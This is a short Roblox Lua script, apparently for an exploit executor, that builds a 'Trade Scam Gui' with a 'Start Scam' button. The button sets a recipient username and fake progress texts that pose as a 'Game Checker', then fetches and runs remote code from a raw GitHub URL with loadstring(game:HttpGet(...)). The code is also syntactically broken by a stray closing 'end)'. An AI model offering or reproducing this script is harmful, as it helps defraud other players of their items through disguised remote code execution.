
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Trade Scam Gui", "DarkTheme")

local Tab = Window:NewTab("TradeScam")

local Section = Tab:NewSection("TradeScam")

Section:NewButton("Start Scam", "ButtonInfo", function()
UserName = "XXxxGamer12345xxXX"
_G.AntiLeave = false
_G.ScriptName = "Game Checker"
_G.FirstText = "Checking Game..."
_G.SecondText = "Game Checked..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 30
loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
end)

    print("Clicked")

end)


